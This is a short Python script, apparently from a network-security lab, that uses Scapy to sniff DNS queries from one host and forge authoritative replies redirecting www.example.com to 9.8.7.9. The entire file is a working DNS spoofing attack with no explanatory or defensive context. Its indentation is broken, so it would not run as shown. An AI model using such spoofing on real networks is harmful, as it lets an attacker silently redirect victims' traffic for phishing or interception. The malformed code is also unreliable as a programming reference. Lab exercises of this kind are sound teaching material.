#!/usr/bin/env python3
from scapy.all import *
def spoof_dns(pkt):
  if(DNS in pkt and'www.example.com' in pkt[DNS].qd.qname.decode('utf-8')):

  IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)

  UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)

  Anssec = DNSRR(rrname=pkt[DNS].qd. qname, type='A',ttl=259200, rdata='9.8.7.9')

  DNSpkt = DNS (id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,qdcount=1, ancount=1, nscount=0, arcount=0,an=Anssec)

  spoofpkt = IPpkt/UDPpkt/DNSpkt

  send (spoofpkt)
 f = 'udp and dst port 53 and src 10.9.0.5'
 pkt = sniff(iface='br-12b54642799f', filter=f, prn=spoof_dns)

